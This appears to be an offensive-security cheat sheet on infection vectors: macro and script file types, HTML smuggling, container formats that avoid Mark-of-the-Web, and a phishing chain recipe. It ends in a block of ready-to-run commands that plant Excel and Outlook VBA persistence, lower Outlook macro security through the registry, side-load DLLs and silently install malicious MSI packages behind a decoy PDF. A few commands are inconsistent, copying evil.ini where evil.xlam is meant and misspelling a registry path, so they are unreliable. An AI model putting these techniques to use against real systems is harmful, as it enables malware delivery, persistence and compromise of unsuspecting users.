## Infection Vectors and Chains

### Classic File Infection Vectors

#### MAC

- initial access is getting harder, for example for MAC you can still bypass
  - Unsigned apps (gets through with few clicks)
  - Office Macros + `.SLK` Excel4 macros (constrained by gatekeeper)
  - you can use [Mystikal](https://github.com/D00MFist/Mystikal)
- Use `LNK, CHM, CPL, DLL, MSI, HTML, SVG`; hold `Office w/macros, ISO, VHD, XSL`.

#### Windows Script Host

- VBE, VBS, JSE, JS, XSL, HTA, WSF
- Mostly well detected and subject to AMSI detection. **Effectiveness significantly reduced for Office macros due to default security settings blocking macros from the internet (`MOTW`).**
- Viable strategies for WSH scripts (often requiring MOTW bypass or user interaction):
  - File Dropper
    - download a file from internet/ UNC share or unpack from itself
    - save the file onto workstation
    - run the file directly/indirectly via LOLBIN
  - DotNetToJScript / GadgetToJScript
    - a way to deserialize and run `.NET` executables in-memory
    - use BinaryFormatter to deserialize them
  - XSL TransformNode
    - simple technique to run XSL/XML files in-memory while maintaining low IOC footprint
  - XLAM Dropper
    - Macro-enabled excel add-in file
    - when dropped to `%APPDATA%\Microsoft\Excel\XLSTART`, they are auto-executed when starting excel
  - Microsoft Compiled Help Messages
    - can be used to run a system command whenever user browses into them
    - some used to run VBS or quietly install MSI
  - LNK
    - EXE/ZIP embedded into LNK
    - can be polyglot-ted with `HTA/ISO/PDF/ZIP/RAR/7z`
    - use icons to weaponize, inspect with [LEcmd](https://github.com/EricZimmerman/LECmd) to make sure not disclosing MAC & hostname
    - always run through a LOLBIN like `conhost.exe`
  - HTML Smuggling
    - body `onload` callback
    - optional `setTimeout` delay or direct entrypoint call
    - embedded payload footprint
    - actual logic
      - create a JavaScript `Blob` object holding raw file data
      - if operating on IE use `msSaveOrOpenBlob`
      - else, create a dynamic `<a style="display:none"></a>` HTML node
      - invoke `URL.createObjectURL()` and set `<a href="...">`
      - set download name via `<a>.download`
      - programmatically click the anchor to trigger the download
    - use [detect-headless](https://github.com/infosimples/detect-headless) to identify sandboxes
    - run anti-headless logic after some time elapses
    - Can bypass most secure gateways, but the downloaded file (e.g., ISO, ZIP, LNK, document) still faces endpoint scrutiny. **If the smuggled file relies on macros (e.g., `.docm`), it will likely be blocked by default Office security unless the user explicitly enables content.**
  - COM Hijack
- every VBA strategy requires launcher **and often needs to overcome default macro security blocks**:
  - `WScript.Shell`
  - `WMI Win32_Process::Create`
  - `Shell(...)`
  - etc

### Complex Infection Chains

#### Containerized Malware

- Files downloaded from internet have Mark of the Web(`MOTW`) taint flag
- **Default Behavior:** Office documents having `MOTW` flag have their macros blocked by default, preventing automatic execution. This is a major mitigation against traditional macro-based attacks.
- You can download it from intranet or trusted locations to circumvent this (less common for initial access).
- Some container file formats do not propagate `MOTW` flag to inner files when extracted, providing a potential bypass:
  - ISO / IMG
  - 7zip
  - CAB
  - VHD / VHDX
  - WIM
  - check [MOTW Comparison](https://github.com/nmantani/archiver-MOTW-support-comparison) to make sure

> [!Note]
> (Windows 11 22H2+): ISOs opened via double-click in Explorer inherit MOTW. Using `Mount-DiskImage` via PowerShell typically avoids propagation; validate on your build.

#### Chains Recipe

- In‑the‑wild sample
  - Spear-Phishing
  - Link in mail or Link in PDF
  - HTML Smuggling drops ISO or ZIP
  - ZIP contains `RTLO`‑tricked `.EXE` disguised as `.PDF` being legit 7‑Zip executable
    - `.PDF.EXE` when clicked, sideloads benign `vcruntime140.dll` that imports evil `7za.dll`
  - ISO contains `LNK` + DLL
    - `.LNK` runs `rundll32 evil.dll,SomeExport`
- **Delivery** - convey your chain (HTML smuggling drop in drive-by download fashion)
- **Container** - archive bundling all infection files
  - `ISO/IMG/ZIP` can contain hidden files
- **Trigger** - some way to run our payload (`LNK/CHM`)
- **Payload** - our malware
  - **Note:** Macro-enabled office documents (`.docm`, `.xlsm`) are less reliable for initial execution due to `MOTW` blocks unless combined with social engineering or specific bypasses.
  - can be macro-enabled office document with `MOTW` stripped (e.g., delivered inside a container like ISO/VHD)
  - `DLL/CPL/XLL` to be loaded by trigger directly or indirectly with LOLBIN (XLLs also subject to `MOTW` blocking if downloaded directly)
  - `XLAM` to be copied to `XLSTART` for persistence & abusing office trusted path
  - `MSI/MSP` to run during silent installation (`MOTW` stripped)
  - `VbaProject.OTM` for outlook persistence
  - `.EXE + .DLL` executing through side-loading attack
- **Decoy** - keep your victim happy by displaying some interesting stuff

#### Successful Strategies

```bash
# plant evil.xlam to %APPDATA%\Microsoft\Excel\XLSTART so that next time user opens up Excel it will get loaded
cmd /c echo f | xcopy /Q/R/S/Y/H/G/I evil.ini %APPDATA%\Microsoft\Excel\XLSTART | decoy.pdf

# Plant VbaProject.otm to %APPDATA%\Microsoft\Outlook\VbaProject.OTM and alter registry so upon outlook restart VBA will be loaded and act on every new email arrived
cmd /c reg add hkcu\software\micorosft\office\16.0\outlook\security /f /v Level /t reg_dword /d 1 | echo f | xcopy /Q/R/S/Y/H/G/I evil.xlam %APPDATA%\Microsoft\Outlook\VbaProject.OTM | decoy.pdf
# corrected HKCU path
cmd /c reg add hkcu\software\microsoft\office\16.0\outlook\security /f /v Level /t reg_dword /d 1 | echo f | xcopy /Q/R/S/Y/H/G/I evil.xlam %APPDATA%\Microsoft\Outlook\VbaProject.OTM | decoy.pdf

# your ZIP/ISO/IMG will contain signed executable prone to DLL Hijacking/side-loading and appropriate malicious DLL
cmd /c DISM.exe | decoy.pdf

# load .DLL through LOLBIN
cmd /c rundll32 evil.dll,Infect | decoy.pdf

# LNK/CHM that runs PowerShell to locate own .ZIP, then unpacks ZIP contents elsewhere then changes dir into there, then registers .XLL (having stripped MOTW)

# ClickOnce deployment requires several local files; bundle into ZIP/ISO, hide them, then deploy ClickOnce followed by opening decoy.pdf

# PowerShell might use Unblock-File on .MSI and then silently install it
powershell Unblock-File evil.msi; msiexec /q /i .\evil.msi ; .\decoy.pdf

# install signed MSI and apply an unsigned MST
powershell msiexec /q /i .\Zoom-signed-installer.msi TRANSFORMS=evil.mst ; .\decoy.pdf

# run WSH script
cmd /c wscript evil.wsf | decoy.pdf

# LNK/CHM that runs PowerShell to locate its own ZIP, then unpacks ZIP contents elsewhere, changes directory and runs tasks (e.g., deploy ClickOnce)
```

